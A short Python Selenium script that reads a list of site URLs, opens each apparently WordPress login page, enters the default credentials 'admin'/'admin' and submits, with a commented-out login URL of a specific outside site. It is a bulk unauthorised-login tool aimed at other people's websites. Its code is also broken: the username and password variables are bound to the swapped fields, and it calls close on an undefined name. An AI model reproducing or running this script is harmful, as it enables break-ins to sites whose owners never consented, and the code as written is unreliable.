
#coding:utf-8
from selenium import webdriver
import time
import os
import re
import requests
chromedriver = "chromedriver.exe"
f = open('site.txt')
for i in f.readlines():
    driver = webdriver.Chrome(chromedriver)
    driver.get(i)
    username = driver.find_element_by_name('pwd')
    password = driver.find_element_by_name('log')
    girisyap = driver.find_element_by_xpath(' //*[@id="wp-submit"]')
    username.send_keys('admin')
    password.send_keys('admin')
    time.sleep(5)
    girisyap.click()
    username.clear()
    password.clear()
    site.close()


#driver.get('http://www.ferreteriaportuguesa.com/wp-login.php')
#driver = webdriver.Chrome(chromedriver)
